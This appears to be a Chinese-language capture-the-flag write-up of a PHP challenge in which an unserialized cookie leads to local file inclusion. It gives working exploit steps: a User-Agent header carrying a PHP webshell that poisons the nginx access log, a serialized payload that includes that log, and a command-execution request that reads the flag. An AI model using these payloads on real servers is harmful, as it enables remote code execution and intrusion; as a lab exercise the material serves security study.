## 分析

```
if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```

就是一个反序列漏洞造成的 `LFI` 文件包含, 但是 `flag` 文件名为随机的，所以就需要获得一个`shell`

利用思路：
	
1. 首先在 access_log 中注入我们的 php 代码，需要注意这里需要双引号

```
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0<?php system($_GET[1]);?>"
```


2. 然后生成一个包含 `/var/log/nginx/access.log` 的反序列化 payload

```php
$page = new PageModel;
$page->file = '/var/log/nginx/access.log';
print(base64_encode(serialize($page)));
```

3. 然后在 `cookie`中注入反序列化的 payload，触发文件包含漏洞
    
4. 访问 `GET /?1=cat%20../flag_5Yces` 获取 flag
	